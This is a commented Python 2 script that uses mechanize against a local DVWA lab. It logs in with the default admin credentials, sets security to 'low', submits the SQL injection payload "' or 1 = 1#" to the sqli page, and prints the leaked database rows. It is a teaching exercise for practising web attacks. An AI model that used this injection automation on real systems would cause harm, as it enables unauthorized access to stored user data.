#!/usr/bin/python


# importing modules

import mechanize
from bs4 import BeautifulSoup


## defining constants/SQL injection
sqlInjection = "' or 1 = 1#"

## defining functions

def printFunc(data):
    print "\n"
    print "#" *100
    print "#" + data
    print "#" *100

## procedure

    # first we need to intialize the browser with mechanize
br = mechanize.Browser()

    # now lets enter the dvwa page hosted by localhost
br.open("http://localhost/DVWA")

    # now lets test where we are at in the emulated mechanize browser using the .title() method
    # instead we will pass the title into our output function defined above
printFunc(br.title())
print "by now we should be at the log in page. \n"

    # now lets log in
    # we should select the first form, because there is only one form
br.select_form(nr=0)
    # now lets fill in some info
        # after viewing the source code for this html page, the two inputs have names: username, and password
    # remember after selecting the form the mechanize browser is now in the form's scope, so the following is legal
br['username'] = 'admin'
br['password'] = 'password'
    # now lets submit the form
br.submit()

    # lets check again if the log in was successful by printing out the current page of the browser
printFunc(br.title())
print "by now we should be at the welcome page. \n"

    # now we will set the security setting to be low
    # everytime we open this from mechanize, it is not a cached browser, so the default setting will be "impossible"
    # going to the security page
br.open("http://localhost/DVWA/security.php")
    # selecting the first form
br.select_form(nr=0)
    # changing the security value to low
    # for select options, the value must be in a list format
br['security'] = ['low']
    # submitting the value
br.submit()

    # once we have set the security level to low, in order to allow sql injections, 
    # lets go to the sql injection page of the website by using browser.open method
br.open("http://localhost/DVWA/vulnerabilities/sqli/")

    # lets check where we are at rn
printFunc(br.title())
print "by now we should be at the sql injection vulnerbility page"

    # alrighty lets start the sql injection now
printFunc("The SQL Injection: " + sqlInjection + " We will now start the injection process")

    # we will select the first and only form of the page, enter the sqlinject and submitting
    # after viewing the source code the name value of the input is id for user id
br.select_form(nr=0)
br['id'] = sqlInjection
br.submit()

    # now lets get the html response from the last submit, by using reponse() method, and html output from read() method
afterInjectPage = br.response().read()
   
    # next, lets feed the html response to the lxml html parser by beautifulsoup
bs = BeautifulSoup(afterInjectPage, 'lxml')

    # after a few trial runs, we can see the source page after a successful sql injection
    # all the important things we want from the sql database will be shown inside the html tags <pre>
    # so lets find all the pretags first -> returns a list of all pre tags objects
allPreTags = bs.find_all('pre')
    
    # we can now iterate it through
for pre in allPreTags: 
    print pre





